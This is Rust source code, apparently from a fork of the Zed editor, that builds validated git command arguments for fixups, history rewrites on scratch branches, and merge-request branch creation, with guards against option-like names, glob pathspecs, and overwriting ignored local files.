    pub fn args(self) -> Vec<String> {
        match self {
            // `--binary` keeps the patch applicable when a binary file changed;
            // without it `git apply` rejects the hunk with "no binary data".
            Self::Worktree => vec!["diff".into(), "--binary".into()],
            Self::Index => vec!["diff".into(), "--binary".into(), "--cached".into()],
            Self::HeadCommit => vec![
                "format-patch".into(),
                "--binary".into(),
                "--stdout".into(),
                "-1".into(),
                "HEAD".into(),
            ],
        }
    }

    /// Default file name offered in the save dialog.
    pub fn suggested_file_name(self) -> &'static str {
        match self {
            Self::Worktree => "worktree.patch",
            Self::Index => "staged.patch",
            Self::HeadCommit => "head-commit.patch",
        }
    }
}

/// One commit of a rewritten range: the commits whose changes it applies, oldest first, and the
/// message it ends up with.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct RewriteGroup {
    /// Applied in this order. The first one is the commit whose author the result keeps.
    pub shas: Vec<String>,
    /// `None` keeps what the commit already says, which only a group of exactly one can do.
    pub message: Option<String>,
}

/// One command of a history rewrite, with the commit whose author it has to carry.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct RewriteCommand {
    pub args: Vec<String>,
    /// `GIT_AUTHOR_*` read from this commit belong in the command's environment. A plain
    /// `cherry-pick` copies the original author by itself, so only a rebuilt `commit` needs them.
    pub author_of: Option<String>,
}

impl RewriteCommand {
    fn plain(args: Vec<String>) -> Self {
        Self {
            args,
            author_of: None,
        }
    }
}

/// The namespace every scratch branch of a history rewrite lives in.
///
/// `rewrite_cleanup_commands` force-deletes a branch, so the prefix is what tells a branch this
/// fork created apart from one the user did: nothing outside it is ever deleted.
pub const REWRITE_SCRATCH_BRANCH_PREFIX: &str = "zed-rewrite/";

/// The branch a rewrite of the range ending at `newest_sha` is built on.
///
/// Derived from the range rather than random so that the name in the confirmation is the name the
/// user finds if a rewrite stops half-way, and namespaced so that it cannot collide with a branch
/// somebody meant to keep.
pub fn rewrite_scratch_branch_name(newest_sha: &str) -> String {
    let short: String = newest_sha.chars().take(SHORT_SHA_LENGTH).collect();
    format!("{REWRITE_SCRATCH_BRANCH_PREFIX}{short}")
}

/// Whether `branch` is a scratch branch a history rewrite left behind, which is the only kind
/// [`rewrite_cleanup_commands`] may delete.
///
/// The name has to carry something after the prefix: `zed-rewrite/` on its own is not a ref git
/// would accept, and treating it as one of ours would put an empty name into `branch -D`.
pub fn is_rewrite_scratch_branch(branch: &str) -> bool {
    branch
        .strip_prefix(REWRITE_SCRATCH_BRANCH_PREFIX)
        .is_some_and(|rest| !rest.is_empty())
}

/// `git rebase --autostash --onto <new_base> <upstream> [<branch>]`, which replays everything
/// after `upstream` on top of `new_base`.
///
/// `--autostash` always goes on the command line; a git too old for it drops the flag where the
/// command runs and refuses a dirty worktree instead (ADR-F47).
pub fn rebase_onto_args(new_base: &str, upstream: &str, branch: Option<&str>) -> Vec<String> {
    let mut args = vec![
        "rebase".to_string(),
        "--autostash".to_string(),
        "--onto".to_string(),
        new_base.to_string(),
        upstream.to_string(),
    ];
    args.extend(branch.map(str::to_string));
    args
}

/// Which uncommitted changes a fixup folds into the commit it targets.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum FixupChanges {
    /// What is staged, and nothing else (`commit --fixup`).
    Staged,
    /// Every change to a tracked file, staged or not (`commit --fixup -a`). Untracked files stay
    /// out, as they do from any `commit -a`.
    AllTracked,
    /// Exactly these files as the working tree has them, staged or not and tracked or not, and
    /// nothing else that happens to be staged.
    Paths(Vec<RepoPath>),
}

/// A path handed to git as nothing but itself: `:(literal)` keeps `*`, `?` and `[` from being
/// read as a glob that pulls in files the user never picked, and a pathspec starting with `:`
/// cannot be taken for an option either.
fn literal_pathspec(path: &RepoPath) -> String {
    format!(":(literal){}", path.as_unix_str())
}

/// The commands that record `changes` as a `fixup!` commit of `target`, in order; the last one
/// is the commit.
///
/// `untracked` are the files of [`FixupChanges::Paths`] git does not track yet. `commit --only`
/// takes a file from the working tree only when git already knows it, so those are added first,
/// and only those: `add` refuses a path whose deletion is already staged, which `commit --only`
/// records without help.
pub fn fixup_commit_commands(
    target: &str,
    changes: &FixupChanges,
    untracked: &[RepoPath],
) -> Result<Vec<Vec<String>>> {
    anyhow::ensure!(
        !target.is_empty(),
        i18n::t!("The commit to fold the changes into is unknown.")
    );
    let mut commit = vec!["commit".to_string(), format!("--fixup={target}")];
    Ok(match changes {
        FixupChanges::Staged => vec![commit],
        FixupChanges::AllTracked => {
            commit.push("-a".to_string());
            vec![commit]
        }
        FixupChanges::Paths(paths) => {
            anyhow::ensure!(
                !paths.is_empty(),
                i18n::t!("There are no files to fold in.")
            );
            let mut commands = Vec::with_capacity(2);
            if !untracked.is_empty() {
                let mut add = vec!["add".to_string(), "--".to_string()];
                add.extend(untracked.iter().map(literal_pathspec));
                commands.push(add);
            }
            commit.extend(["--only".to_string(), "--".to_string()]);
            commit.extend(paths.iter().map(literal_pathspec));
            commands.push(commit);
            commands
        }
    })
}

/// The `git diff --name-only` that lists what [`fixup_commit_commands`] would record, so that a
/// fixup with nothing in it is refused before anything runs. Untracked files of
/// [`FixupChanges::Paths`] never show up here; the caller counts those itself.
pub fn fixup_changes_probe_args(changes: &FixupChanges) -> Vec<String> {
    let mut args = vec!["diff".to_string()];
    match changes {
        FixupChanges::Staged => args.extend(["--cached".to_string(), "--name-only".to_string()]),
        FixupChanges::AllTracked => args.extend(["HEAD".to_string(), "--name-only".to_string()]),
        FixupChanges::Paths(paths) => {
            args.extend([
                "HEAD".to_string(),
                "--name-only".to_string(),
                "--".to_string(),
            ]);
            args.extend(paths.iter().map(literal_pathspec));
        }
    }
    args
}

/// Takes the files [`fixup_commit_commands`] added back out of the index, for when the commit
/// after it was refused: none of them was tracked, so this leaves them untracked again.
pub fn fixup_unstage_args(untracked: &[RepoPath]) -> Option<Vec<String>> {
    if untracked.is_empty() {
        return None;
    }
    let mut args = vec!["reset".to_string(), "-q".to_string(), "--".to_string()];
    args.extend(untracked.iter().map(literal_pathspec));
    Some(args)
}

/// `git rebase -i --autosquash --autostash --keep-empty <parent of the target>` (`--root` when
/// the target is the repository's first commit), which folds the `fixup!` commit into its target.
///
/// `-i` without anyone editing the todo list: `run_command` pins `GIT_SEQUENCE_EDITOR` to `:`, so
/// git takes the list `--autosquash` arranged as it stands. `--keep-empty`, because a git before
/// 2.26 comments out commits that were empty to begin with, and the untouched list would then drop
/// them from the branch.
pub fn fixup_rebase_args(target_parent: Option<&str>) -> Vec<String> {
    let mut args = vec![
        "rebase".to_string(),
        "-i".to_string(),
        "--autosquash".to_string(),
        "--autostash".to_string(),
        "--keep-empty".to_string(),
    ];
    match target_parent {
        Some(parent) => args.push(parent.to_string()),
        None => args.push("--root".to_string()),
    }
    args
}

/// Whether `rebase --autosquash` takes a commit with this subject for one to fold into another.
///
/// A fixup's rebase would fold every such commit it replays, including ones the user is keeping
/// for later, so a range holding one is refused instead.
pub fn is_autosquash_subject(subject: &str) -> bool {
    ["fixup! ", "squash! ", "amend! "]
        .iter()
        .any(|prefix| subject.starts_with(prefix))
}

/// `git log --format=%H -1 @{upstream}..<sha>`: prints nothing when the current branch's
/// upstream already contains `sha`. Read it with [`is_pushed_from_probe`].
pub fn pushed_probe_args(sha: &str) -> Vec<String> {
    vec![
        "log".to_string(),
        "--format=%H".to_string(),
        "-1".to_string(),
        format!("@{{upstream}}..{sha}"),
    ]
}

/// Whether the commit [`pushed_probe_args`] asked about has been pushed, which is when rewriting
/// it leaves the branch needing a force push.
///
/// A branch without an upstream (and a detached HEAD) makes git refuse `@{upstream}`, and counts
/// as not pushed; [`has_upstream_from_probe`] tells that case apart.
pub fn is_pushed_from_probe(output: &GitCommandOutput) -> bool {
    output.succeeded() && output.stdout.trim().is_empty()
}

/// Whether the branch [`pushed_probe_args`] asked on has an upstream to compare with. Without one
/// nothing says whether the commit is on a remote, so it is not called pushed or unpushed.
pub fn has_upstream_from_probe(output: &GitCommandOutput) -> bool {
    output.succeeded()
}

/// Whether the `git log --format=%s` of a fixup's range, run after its rebase finished, still
/// holds a commit waiting to be folded. The range held none before (such a range is refused), so
/// one there now is the fixup's own that `--autosquash` could not pair with its target. Counting
/// the commits instead would take one that the rebase dropped for having become empty for a
/// `fixup!` left standing.
pub fn fixup_left_unfolded(subjects_after: &str) -> bool {
    subjects_after.lines().any(is_autosquash_subject)
}

/// What `Repository::fixup_target` found out about the commit changes are about to be folded into.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct FixupTarget {
    /// The full SHA the caller's SHA resolved to.
    pub sha: String,
    pub subject: String,
    /// The current branch's upstream already has the commit, so folding into it rewrites pushed
    /// history.
    pub pushed: bool,
    /// The current branch has an upstream; without one, `pushed` is `false` for want of anything
    /// to compare with, not because the commit is known to be only here.
    pub has_upstream: bool,
    /// The full ref of the branch the fixup rewrites (`refs/heads/…`), so that taking it back
    /// later moves that branch and no other that happens to point at the same commit.
    pub branch: String,
}

/// How a fixup ended.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum FixupOutcome {
    /// The changes are in the target, and the branch moved from `old_head` to `new_head`.
    Folded { old_head: String, new_head: String },
    /// git refused to record the changes (a hook, or nothing left to commit). History is as it
    /// was; `head_moved` says whether HEAD is nonetheless somewhere else now.
    NotCommitted {
        output: GitCommandOutput,
        head_moved: bool,
    },
    /// The rebase stopped part-way (a conflict). The git panel's banner continues or aborts it,
    /// and aborting leaves the changes in the `fixup!` commit on top of `old_head`. Skipping the
    /// `fixup!` pick drops them from the branch, leaving `fixup_commit` as the only way back.
    RebaseStopped {
        message: String,
        old_head: String,
        fixup_commit: String,
    },
    /// The rebase failed without stopping part-way. `rolled_back` is the `fixup!` commit taken
    /// back off the branch (`reset --soft`, leaving its changes staged), which only happens when
    /// git left the index and the working tree untouched; otherwise the commit is still on top of
    /// the branch and the working tree may be half-way to the older tree.
    RebaseRefused { message: String, rolled_back: bool },
    /// The rebase finished but left the `fixup!` commit standing on its own, which only happens
    /// when `--autosquash` could not pair it with the target.
    LeftUnfolded { old_head: String, new_head: String },
    /// The rebase finished, but git could not put the working-tree changes its `--autostash` had
    /// set aside back, and kept them as the newest stash entry instead of failing.
    ChangesLeftInStash { old_head: String, new_head: String },
}

/// Puts the user back on `branch` and throws the scratch branch away: the tail of a rewrite that
/// worked, and the way back from one that did not.
///
/// `branch -D` deletes whatever it is handed, commits and all, so the name has to be one of ours
/// ([`is_rewrite_scratch_branch`]) and cannot be the branch we are switching back to.
pub fn rewrite_cleanup_commands(branch: &str, scratch_branch: &str) -> Result<Vec<Vec<String>>> {
    anyhow::ensure!(
        is_rewrite_scratch_branch(scratch_branch) && branch != scratch_branch,
        i18n::t!("\"{scratch_branch}\" is not a scratch branch, so it cannot be deleted.")
    );
    anyhow::ensure!(
        !branch.is_empty(),
        i18n::t!(
            "The branch to go back to is unknown, so there is no way back from the scratch branch."
        )
    );
    Ok(vec![
        vec!["switch".to_string(), branch.to_string()],
        vec![
            "branch".to_string(),
            "-D".to_string(),
            scratch_branch.to_string(),
        ],
    ])
}

/// The commands that replace `base..upstream` on `branch` with `groups`, in order.
///
/// `git rebase -i` is not an option: it drives its todo list through an editor, and this fork
/// never lets git start a program (see [`ALLOWED_GIT_COMMAND_ENV`]). The rewritten history is
/// built commit by commit on a scratch branch starting at `base` instead, and `branch` only moves
/// once, at the final `rebase --onto`. Nothing the user can reach changes before that, so a
/// failure part-way only has to throw the scratch branch away
/// ([`rewrite_cleanup_commands`]).
///
/// `groups` may be empty, which is every commit of the range dropped.
pub fn rewrite_range_commands(
    base: &str,
    groups: &[RewriteGroup],
    upstream: &str,
    branch: &str,
    scratch_branch: &str,
) -> Result<Vec<RewriteCommand>> {
    anyhow::ensure!(
        !branch.is_empty() && !base.is_empty() && !upstream.is_empty(),
        i18n::t!("Could not determine the range to rewrite.")
    );
    // git counts ignored files as expendable: without `--no-overwrite-ignore`, a file the user's
    // branch ignores (a local `.env`, say) but `base` still tracks would be overwritten here, and
    // deleted once the branch is replayed past the commit that stopped tracking it.
    let mut commands = vec![RewriteCommand::plain(vec![
        "switch".to_string(),
        "--no-overwrite-ignore".to_string(),
        "-c".to_string(),
        scratch_branch.to_string(),
        base.to_string(),
    ])];
    for group in groups {
        let (first, rest) = group
            .shas
            .split_first()
            .context(i18n::t!("A row has no commits."))?;
        match &group.message {
            // Plain `cherry-pick` writes the commit itself, keeping both its message and its
            // author, so a commit that is only being moved needs nothing else.
            None => {
                anyhow::ensure!(
                    rest.is_empty(),
                    i18n::t!("Squashed commits need a message.")
                );
                commands.push(RewriteCommand::plain(vec![
                    "cherry-pick".to_string(),
                    first.clone(),
                ]));
            }
            Some(message) => {
                let mut cherry_pick = vec!["cherry-pick".to_string(), "-n".to_string()];
                cherry_pick.extend(group.shas.iter().cloned());
                commands.push(RewriteCommand::plain(cherry_pick));
                commands.push(RewriteCommand {
                    args: vec!["commit".to_string(), "-m".to_string(), message.clone()],
                    author_of: Some(first.clone()),
                });
            }
        }
    }
    commands.push(RewriteCommand::plain(rebase_onto_args(
        scratch_branch,
        upstream,
        Some(branch),
    )));
    commands.extend(
        rewrite_cleanup_commands(branch, scratch_branch)?
            .into_iter()
            .map(RewriteCommand::plain),
    );
    Ok(commands)
}

/// The commits a history rewrite checks out or replays, for [`touched_paths_probe_commands`].
#[derive(Clone, Copy, Debug)]
pub enum RewrittenCommits<'a> {
    /// A revision range for `git log` (`<base>..HEAD`, or `HEAD` for all of history).
    Range(&'a str),
    /// Exactly these commits, as the merge-request box replays them.
    Commits(&'a [String]),
}

/// How many commits one `git log --no-walk` of [`touched_paths_probe_commands`] names.
const TOUCHED_PATHS_PROBE_COMMITS: usize = 200;

/// How long the pathspecs of one `git ls-files` of [`ignored_files_probe_commands`] may get:
/// Windows refuses a command line over 32 767 characters.
const IGNORED_FILES_PROBE_PATHSPEC_BUDGET: usize = 16_000;

/// How many ignored files [`ignored_files_refusal`] names before it only counts the rest.
const IGNORED_FILES_NAMED: usize = 5;

/// The `git log` commands listing every path `commits` change, NUL-separated (see
/// [`parse_nul_separated_paths`]).
///
/// git counts ignored files as expendable: `cherry-pick` and the replay of a `rebase` overwrite a
/// local ignored file (a `.env`, say) with the version a commit tracks, without a word, and delete
/// it once a later commit stops tracking it. Only the paths some rewritten commit touches can be
/// written that way, which keeps [`ignored_files_probe_commands`] from walking every ignored file
/// of the working tree (`target/`, `node_modules/`).
pub fn touched_paths_probe_commands(commits: RewrittenCommits<'_>) -> Vec<Vec<String>> {
    let log = || {
        vec![
            "log".to_string(),
            "--format=".to_string(),
            "--name-only".to_string(),
            "--no-renames".to_string(),
            "-z".to_string(),
        ]
    };
    match commits {
        RewrittenCommits::Range(range) => {
            let mut args = log();
            args.push(range.to_string());
            vec![args]
        }
        RewrittenCommits::Commits(shas) => shas
            .chunks(TOUCHED_PATHS_PROBE_COMMITS)
            .map(|chunk| {
                let mut args = log();
                args.push("--no-walk".to_string());
                args.extend(chunk.iter().cloned());
                args
            })
            .collect(),
    }
}

/// The paths of a `-z` listing from `git log --name-only` or `git ls-files`.
pub fn parse_nul_separated_paths(stdout: &str) -> impl Iterator<Item = &str> {
    stdout.split('\0').filter(|path| !path.is_empty())
}

/// The `git ls-files` commands that find which of `paths` (relative to the repository root, as
/// `git log --name-only` prints them) are ignored files that exist in the working tree without
/// being tracked. Empty when `paths` is.
pub fn ignored_files_probe_commands<'a>(
    paths: impl IntoIterator<Item = &'a str>,
) -> Vec<Vec<String>> {
    let command = || {
        vec![
            "ls-files".to_string(),
            "--others".to_string(),
            "--ignored".to_string(),
            "--exclude-standard".to_string(),
            "-z".to_string(),
            "--".to_string(),
        ]
    };
    let mut commands = Vec::new();
    let mut current = command();
    let mut length = 0;
    for path in paths {
        let pathspec = format!(":(top,literal){path}");
        if length > 0 && length + pathspec.len() > IGNORED_FILES_PROBE_PATHSPEC_BUDGET {
            commands.push(std::mem::replace(&mut current, command()));
            length = 0;
        }
        length += pathspec.len() + 1;
        current.push(pathspec);
    }
    if length > 0 {
        commands.push(current);
    }
    commands
}

/// Why a history rewrite is refused when `ignored` (what [`ignored_files_probe_commands`] found)
/// is not empty.
pub fn ignored_files_refusal(ignored: &[String]) -> Option<String> {
    if ignored.is_empty() {
        return None;
    }
    let names = ignored
        .iter()
        .take(IGNORED_FILES_NAMED)
        .map(String::as_str)
        .collect::<Vec<_>>()
        .join(i18n::tc!("list separator", ", "));
    Some(if ignored.len() > IGNORED_FILES_NAMED {
        i18n::t!(
            "Stopped because the ignored local files {names} and {count} more would be overwritten \
             and lost during the rewrite. Move them somewhere else and try again.",
            count = ignored.len() - IGNORED_FILES_NAMED
        )
    } else {
        i18n::t!(
            "Stopped because the ignored local files {names} would be overwritten and lost during \
             the rewrite. Move them somewhere else and try again."
        )
    })
}

/// What sets a merge-request build's scratch branch apart from a history rewrite's inside
/// [`REWRITE_SCRATCH_BRANCH_PREFIX`].
const MERGE_REQUEST_SCRATCH_MARKER: &str = "mr-";

/// The scratch branch a merge-request branch is built on, named after the newest commit of the
/// merge-request box.
///
/// It lives in the rewrite namespace on purpose: a build that stops on a conflict parks the user
/// on it, and the git panel's banner only knows how to take the user back from, and delete, a
/// branch in that namespace ([`is_rewrite_scratch_branch`], [`rewrite_cleanup_commands`]).
pub fn merge_request_scratch_branch_name(newest_sha: &str) -> String {
    let short: String = newest_sha.chars().take(SHORT_SHA_LENGTH).collect();
    format!("{REWRITE_SCRATCH_BRANCH_PREFIX}{MERGE_REQUEST_SCRATCH_MARKER}{short}")
}

/// Whether `branch` is the scratch branch of a merge-request build rather than of a rewrite.
pub fn is_merge_request_scratch_branch(branch: &str) -> bool {
    branch
        .strip_prefix(REWRITE_SCRATCH_BRANCH_PREFIX)
        .and_then(|rest| rest.strip_prefix(MERGE_REQUEST_SCRATCH_MARKER))
        .is_some_and(|rest| !rest.is_empty())
}

/// Refuses a merge-request branch name that `git branch` would read as an option, that would put
/// the branch among the scratch branches this fork deletes on its own, or that git would refuse
/// as a ref name.
///
/// git's own refusal comes too late to rely on: `branch` is the last step of the build, after the
/// cherry-picks, and a build that stopped on a conflict carries the name into a continuation that
/// could then only be thrown away together with the conflict resolution. The rules are
/// `git check-ref-format --branch`'s.
pub fn validate_merge_request_branch_name(name: &str) -> Result<()> {
    anyhow::ensure!(
        !name.trim().is_empty(),
        i18n::t!("Enter an MR branch name.")
    );
    anyhow::ensure!(
        !name.starts_with('-'),
        i18n::t!("A branch name cannot start with \"-\".")
    );
    anyhow::ensure!(
        !name
            .chars()
            .any(|character| character.is_whitespace() || character.is_control()),
        i18n::t!("A branch name cannot contain spaces.")
    );
    anyhow::ensure!(
        name != "HEAD" && name != "@",
        i18n::t!("\"{name}\" cannot be used as a branch name.")
    );
    anyhow::ensure!(
        !name.starts_with(REWRITE_SCRATCH_BRANCH_PREFIX),
        i18n::t!(
            "Names starting with \"{prefix}\" are kept for scratch branches.",
            prefix = REWRITE_SCRATCH_BRANCH_PREFIX
        )
    );
    // `refs/heads/x` would become the branch `refs/heads/refs/heads/x`, and pushing it by that
    // name would push the branch `x` instead.
    anyhow::ensure!(
        !name.starts_with("refs/"),
        i18n::t!("A branch name cannot start with \"refs/\".")
    );
    anyhow::ensure!(
        !name
            .chars()
            .any(|character| matches!(character, '~' | '^' | ':' | '?' | '*' | '[' | '\\')),
        i18n::t!("A branch name cannot contain ~ ^ : ? * [ \\.")
    );
    anyhow::ensure!(
        !name.contains("..") && !name.contains("@{") && !name.contains("//"),
        i18n::t!("A branch name cannot contain \"..\", \"@{{\" or \"//\".")
    );
    anyhow::ensure!(
        !name.starts_with('/') && !name.ends_with('/') && !name.ends_with('.'),
        i18n::t!("A branch name cannot start or end with \"/\", or end with \".\".")
    );
    anyhow::ensure!(
        name.split('/')
            .all(|component| !component.starts_with('.') && !component.ends_with(".lock")),
        i18n::t!("A branch name cannot have a part that starts with \".\" or ends with \".lock\".")
    );
    Ok(())
}

/// Refuses the repository's default branch (its local name, `main` for `origin/main`) as the
/// merge-request branch, whether or not the user asked for an existing branch to be recreated:
/// moving it onto the merge request's commit is never what a merge request wants. An unknown
/// default branch leaves the name to the other checks.
pub fn ensure_merge_request_branch_is_not_default(
    name: &str,
    default_branch: Option<&str>,
) -> Result<()> {
    anyhow::ensure!(
        default_branch != Some(name),
        i18n::t!(
            "\"{name}\" is the repository's default branch, so it cannot be the MR branch. Choose another name."
        )
    );
    Ok(())
}

/// The first half of building a merge-request branch: a scratch branch at `base_sha` with every
/// commit of the box replayed on it, oldest first.
///
/// Plain `cherry-pick` rather than `cherry-pick -n`: once one of several no-commit picks
/// conflicts, git refuses to `--continue` (the index already differs from HEAD), which would
/// leave nothing to do with a conflict but abort. `--keep-redundant-commits` keeps a commit whose
/// change the base already has from stopping the pick as "now empty"; the replayed commits are
/// folded into one right after, so the empty ones leave nothing behind.
pub fn merge_request_pick_commands(
    base_sha: &str,
    shas_oldest_first: &[String],
    scratch_branch: &str,
) -> Result<Vec<Vec<String>>> {
    anyhow::ensure!(
        is_merge_request_scratch_branch(scratch_branch),
        i18n::t!(
            "\"{scratch_branch}\" is not a scratch branch, so the MR branch cannot be built on it."
        )
    );
    anyhow::ensure!(
        !base_sha.is_empty() && !base_sha.starts_with('-'),
        i18n::t!("Could not determine the base commit.")
    );
    anyhow::ensure!(
        !shas_oldest_first.is_empty(),
        i18n::t!("The MR box has no commits.")
    );
    anyhow::ensure!(
        shas_oldest_first
            .iter()
            .all(|sha| !sha.is_empty() && !sha.starts_with('-')),
        i18n::t!("Could not determine the commits in the MR box.")
    );
    let mut cherry_pick = vec![
        "cherry-pick".to_string(),
        "--keep-redundant-commits".to_string(),
    ];
    cherry_pick.extend(shas_oldest_first.iter().cloned());
    Ok(vec![
        // git counts ignored files as expendable: without `--no-overwrite-ignore`, a file the
        // user's branch ignores (a local `.env`, say) but the base tracks would be overwritten
        // here, and deleted on the way back to the user's branch.
        vec![
            "switch".to_string(),
            "--no-overwrite-ignore".to_string(),
            "-c".to_string(),
            scratch_branch.to_string(),
            base_sha.to_string(),
        ],
        cherry_pick,
    ])
}

/// What finishing a merge-request branch runs, split where the branch has been put in place, with
/// the names the commands were checked against.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct MergeRequestFinishCommands {
    /// The replayed commits folded into one commit on top of the base, and the merge-request
    /// branch pointed at it.
    pub fold_and_point: Vec<Vec<String>>,
    /// Back to the branch the user started from, and the scratch branch deleted.
    pub return_to_origin: Vec<Vec<String>>,
    pub base_sha: String,
    pub merge_request_branch: String,
    pub origin_branch: String,
    pub scratch_branch: String,
}

/// The second half of building a merge-request branch, run on the scratch branch once every
/// commit has been replayed on it: `reset --soft` to the base and one `commit`, then the
/// merge-request branch is created (or, with `recreate`, moved) at that commit.
///
/// `commit` rather than `commit-tree`, so that a `commit-msg` hook (a review system's
/// `Change-Id`, say) sees the merge request's commit the way it sees any other.
pub fn merge_request_finish_commands(
    base_sha: &str,
    message: &str,
    merge_request_branch: &str,
    recreate: bool,
    origin_branch: &str,
    scratch_branch: &str,
) -> Result<MergeRequestFinishCommands> {
    validate_merge_request_branch_name(merge_request_branch)?;
    anyhow::ensure!(
        !message.trim().is_empty(),
        i18n::t!("Enter a commit message.")
    );
    anyhow::ensure!(
        !base_sha.is_empty() && !base_sha.starts_with('-'),
        i18n::t!("Could not determine the base commit.")
    );
    // The scratch branch is checked out while the merge-request branch is moved, so `branch -f`
    // would happily move the branch the user started from.
    anyhow::ensure!(
        merge_request_branch != origin_branch,
        i18n::t!(
            "The original branch \"{origin_branch}\" cannot be the MR branch. Choose another name."
        )
    );
    anyhow::ensure!(
        is_merge_request_scratch_branch(scratch_branch),
        i18n::t!(
            "\"{scratch_branch}\" is not a scratch branch, so the MR branch cannot be built on it."
        )
    );
    let mut point = vec!["branch".to_string()];
    if recreate {
        point.push("-f".to_string());
    }
    point.extend([merge_request_branch.to_string(), "HEAD".to_string()]);
    Ok(MergeRequestFinishCommands {
        fold_and_point: vec![
            vec![
                "reset".to_string(),
                "--soft".to_string(),
                base_sha.to_string(),
            ],
            vec!["commit".to_string(), "-m".to_string(), message.to_string()],
            point,
        ],
        return_to_origin: rewrite_cleanup_commands(origin_branch, scratch_branch)?,
        base_sha: base_sha.to_string(),
        merge_request_branch: merge_request_branch.to_string(),
        origin_branch: origin_branch.to_string(),
        scratch_branch: scratch_branch.to_string(),
    })
}

pub trait GitRepository: Send + Sync {
    /// Returns the contents of an entry in the repository's index, or None if there is no entry for the given path.
    ///
    /// Also returns `None` for symlinks.
    fn load_index_text(&self, path: RepoPath) -> BoxFuture<'_, Option<Vec<u8>>> {
        let future = self.load_revisions(vec![format!(":{}", path.as_unix_str())]);
        async move { future.await.ok()?.pop()? }.boxed()
    }

    /// Returns the contents of an entry in the repository's HEAD, or None if HEAD does not exist or has no entry for the given path.
    ///
    /// Also returns `None` for symlinks.
    fn load_committed_text(&self, path: RepoPath) -> BoxFuture<'_, Option<Vec<u8>>> {
        let future = self.load_revisions(vec![format!("HEAD:{}", path.as_unix_str())]);
        async move { future.await.ok()?.pop()? }.boxed()
    }
    fn load_blob_content(&self, oid: Oid) -> BoxFuture<'_, Result<Vec<u8>>>;

    fn set_index_text(
        &self,
        path: RepoPath,
        content: Option<Vec<u8>>,
        env: Arc<HashMap<String, String>>,
        is_executable: bool,
    ) -> BoxFuture<'_, anyhow::Result<()>>;

    /// Returns the URL of the remote with the given name.
    fn remote_url(&self, name: &str) -> BoxFuture<'_, Option<String>> {
        let name = name.to_string();
        let fut = self.remote_urls();
        async move { fut.await.remove(&name) }.boxed()
    }

    /// Returns the URL of all remotes.
    fn remote_urls(&self) -> BoxFuture<'_, HashMap<String, String>>;

    /// Resolve a list of refs to SHAs.
    fn revparse_batch(&self, revs: Vec<String>) -> BoxFuture<'_, Result<Vec<Option<String>>>>;

    fn load_revisions(&self, revisions: Vec<String>)
    -> BoxFuture<'_, Result<Vec<Option<Vec<u8>>>>>;

    fn head_sha(&self) -> BoxFuture<'_, Option<String>> {
        async move {
            self.revparse_batch(vec!["HEAD".into()])
                .await
                .unwrap_or_default()
                .into_iter()
                .next()
                .flatten()
        }
        .boxed()
    }

    fn merge_message(&self) -> BoxFuture<'_, Option<String>>;

    fn status(
        &self,
        path_prefixes: &[RepoPath],
        untracked_files: StatusUntrackedFiles,
    ) -> Task<Result<GitStatus>>;
    fn diff_tree(&self, request: DiffTreeType) -> BoxFuture<'_, Result<TreeDiff>>;

    fn stash_entries(&self) -> BoxFuture<'static, Result<GitStash>>;

    fn check_access(&self) -> BoxFuture<'_, Result<()>> {
        async move { Ok(()) }.boxed()
    }

    fn branches(&self) -> BoxFuture<'_, Result<BranchesScanResult>>;

    fn change_branch(&self, name: String) -> BoxFuture<'_, Result<()>>;
    fn create_branch(&self, name: String, base_branch: Option<String>)
    -> BoxFuture<'_, Result<()>>;
    fn rename_branch(&self, branch: String, new_name: String) -> BoxFuture<'_, Result<()>>;

    fn delete_branch(
        &self,
        is_remote: bool,
        name: String,
        force: bool,
    ) -> BoxFuture<'_, Result<()>>;

    fn worktrees(&self) -> BoxFuture<'_, Result<Vec<Worktree>>>;

    /// Returns the creation time of a linked worktree's git metadata
    /// directory (`.git/worktrees/<name>/`), resolved via the worktree's
    /// `.git` file.
    ///
    /// The metadata directory is created by `git worktree add` and removed
    /// by `git worktree remove`, so its creation time identifies a
    /// particular incarnation of the worktree: if the worktree is removed
    /// and recreated at the same path, the creation time changes.
    ///
    /// Returns `Ok(None)` when the worktree directory does not exist at
    /// all, and an error when the directory exists but the time cannot be
    /// determined (e.g. on filesystems without birthtime support); callers
    /// should fail safe in the error case.
    fn worktree_created_at(
        &self,
        worktree_path: PathBuf,
    ) -> BoxFuture<'_, Result<Option<SystemTime>>>;

    fn create_worktree(
        &self,
        target: CreateWorktreeTarget,
        path: PathBuf,
    ) -> BoxFuture<'_, Result<()>>;

    fn checkout_branch_in_worktree(
        &self,
        branch_name: String,
        worktree_path: PathBuf,
        create: bool,
    ) -> BoxFuture<'_, Result<()>>;

    fn remove_worktree(&self, path: PathBuf, force: bool) -> BoxFuture<'_, Result<()>>;

    fn rename_worktree(&self, old_path: PathBuf, new_path: PathBuf) -> BoxFuture<'_, Result<()>>;

    fn reset(
        &self,
        commit: String,
        mode: ResetMode,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>>;

    fn checkout_files(
        &self,
        commit: String,
        paths: Vec<RepoPath>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>>;

    fn show(&self, commit: String) -> BoxFuture<'_, Result<CommitDetails>>;

    fn load_commit(
        &self,
        commit: String,
        ignore_shallow_boundary: bool,
        cx: AsyncApp,
    ) -> BoxFuture<'_, Result<CommitDiff>>;
    fn blame(
        &self,
        path: RepoPath,
        content: Rope,
        line_ending: LineEnding,
    ) -> BoxFuture<'_, Result<crate::blame::Blame>>;

    fn blame_at_revision(
        &self,
        path: RepoPath,
        revision: Oid,
    ) -> BoxFuture<'_, Result<crate::blame::Blame>>;

    /// Returns the absolute path to the repository. For worktrees, this will be the path to the
    /// worktree's gitdir within the main repository (typically `.git/worktrees/<name>`).
    fn path(&self) -> PathBuf;

    fn main_repository_path(&self) -> PathBuf;

    /// Updates the index to match the worktree at the given paths.
    ///
    /// If any of the paths have been deleted from the worktree, they will be removed from the index if found there.
    fn stage_paths(
        &self,
        paths: Vec<RepoPath>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>>;
    /// Updates the index to match HEAD at the given paths.
    ///
    /// If any of the paths were previously staged but do not exist in HEAD, they will be removed from the index.
    fn unstage_paths(
        &self,
        paths: Vec<RepoPath>,
        env: Arc<HashMap<String, String>>,
    ) -> BoxFuture<'_, Result<()>>;

